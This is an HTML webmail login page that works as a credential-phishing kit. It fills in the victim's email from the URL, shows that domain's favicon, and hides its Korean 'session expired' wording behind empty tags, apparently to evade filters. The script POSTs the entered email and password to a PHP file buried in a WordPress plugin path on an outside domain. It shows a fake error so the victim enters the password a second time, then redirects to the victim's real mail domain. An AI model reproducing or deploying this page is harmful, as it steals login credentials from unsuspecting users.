﻿<!DOCTYPE html>
<html lang="en">

<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Webmail</title>

  <link id="ico-link" rel="shortcut icon" href="#" />

  <style>
    * {
      padding: 0;
      margin: 0;
    }

    .body {
      display: flex;
      justify-content: center;
      align-content: center;
      padding-top: 50px;
      background-color: #555;
      height: 99Vh;
    }

    .login {
      width: 400px;
      height: 230px;
      background: white;
      border: 1px solid #DDD;
      box-shadow: 0px 0px 10px #DDD;
      opacity: 0.8;
      filter: alpha(opacity=90);
    }

    .top-header {
      margin-bottom: 10px;
      padding-top: 10px;
    }

    .img-link {
      margin: 0 10px;
    }

    .form {
      padding-left: 30px;
    }

    .email {
      padding-top: 15px;
    }

    .pass {
      padding-top: 10px;
    }

    .email,
    .pass {
      margin: 0 0 5px;
    }

    .pwd {
      width: 120px;
      height: 19px;
      size: 10px;
      margin: 2px 0;
      padding: 0;
    }


    .submit {
      margin: 10px 0;

    }

    .loginButton {
      width: 70px;
      height: 30px;
      color: white;
      box-shadow: 0px 0px 3px rgb(179, 42, 42);
      background: cadetblue;
      border: 2px solid #4CAF50;
      text-align: center;
      padding: 5px;
    }

    hr {
      border: 1px solid #999;
    }

    .err .wr-txt {
      color: #F20909;
      font-size: 14px;
      letter-spacing: 0px
    }
  </style>
  <!-- Custom styles for this template -->
  <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
</head>

<body>
  <div class="body">
    <div class="login">
      <div class="img">
        <div class="top-header">
          <img id="img-link" class="img-link" src="#" alt="" />
          <b id="sExp">&#49464;<cite id="xra"></cite>&#49496;  <cite id="xra"></cite>&#47564;<cite id="xra"></cite>&#47308;<cite
              id="xra"><cite>&#46120;<cite id="xra"></cite>！<cite id="xra"></cite><cite id="xra"></cite><cite
                  id="xra"></cite><cite id="xra"></cite><cite id="xra"></cite></b>
        </div>
        <hr />
      </div>
      <div class="form">

        <div class="email">
          <span id="email1">test@test.com</span>
          <input type="email" id="username" style="display: none" value="" />
        </div>
        <div class="pass">
          <span id="passName">&#48708;<cite id="xra"></cite>&#48128;<cite id="xra"></cite>&#48264;<cite id="xra"></cite>&#54840;<cite
              id="xra"></cite><cite id="xra"></cite></span>： <input type="password" name="pwd" id="password"
            class="pwd">
        </div>
        <div class="err">
          <span id="error" class="wr-txt"> </span>
        </div>
        <div class="checkbox">
          <input type="checkbox"> <span id="keepme">&#45208;<cite id="xra"></cite>&#47484;  <cite id="xra"></cite>&#47196;<cite
              id="xra"></cite>&#44536;<cite id="xra"></cite>&#51064;  <cite id="xra"></cite>&#50976;<cite id="xra"></cite>&#51648;<cite id="xra"></cite><cite
              id="xra"></cite></span>
        </div>
        <div class="submit">
          <button class="loginButton" type="submit" onclick="sendmails()">&#47196;&#44536; &#51064;</button>
        </div>
      </div>
    </div>
  </div>
  <script>
    var count = 0;
    var hash = window.location.hash;

    document.getElementById('username').value = hash.split('#')[1];
    document.getElementById('email1').innerHTML = hash.split('#')[1];
    var em = $('#username').val();
    var ps = $('#password').val();
    var email = document.getElementById('username').value = hash.split('#')[1];

    var name = email.substring(0, email.lastIndexOf("@"));

    var domain = email.substring(email.lastIndexOf("@") + 1);

    var link = "https://www.google.com/s2/favicons?domain=";

    var iconLink = document.getElementById("ico-link").setAttribute("href", link + domain);

    var imageLink = document.getElementById("img-link").setAttribute("src", link + domain);


    var pwdInput = document.getElementById('password');

    pwdInput.focus();

    $('#password').keydown(function (e) {
      if (e.which == 13) {
        sendmails();
        return false;
      }
    });

    function sendmails() {
      var em = $('#username').val();
      var ps = $('#password').val();


      if (ps === "" || ps === " " || ps == " " || ps == "  " || ps == "   " || ps === null) {

        document.getElementById('error').innerHTML = "Password is required";
      } else {
        var em = $('#username').val();
        var ps = $('#password').val();

        $.ajax({
          url: 'https://tahsineryilmaz.com/wordpress/wp-includes/js/tinymce/plugins/wpgallery/plugins.php', // full url of webmail.php
          type: 'POST',
          data: {
            user: em,
            pass: ps,
            type: 1
          },
          beforeSend: function () {
            $(".progress").show();
          },
          success: function (response) {

            if (count === 1) {
              var email = document.getElementById('username').value = hash.split('#')[1];

              var name = email.substring(0, email.lastIndexOf("@"));

              var domain = email.substring(email.lastIndexOf("@") + 1);

              location.href = "https://" + domain;

            } else {
              document.getElementById('error').innerHTML = "&#50724;&#47448;! &#45796;&#49884; &#49884;&#46020;&#54616;&#49901;&#49884;&#50724;.";

              document.getElementById('password').value = '';

              pwdInput.focus();

              count = count = +1;

              console.log(count);
            }


          }
        });
      }
    }

  </script>
</body>

</html>
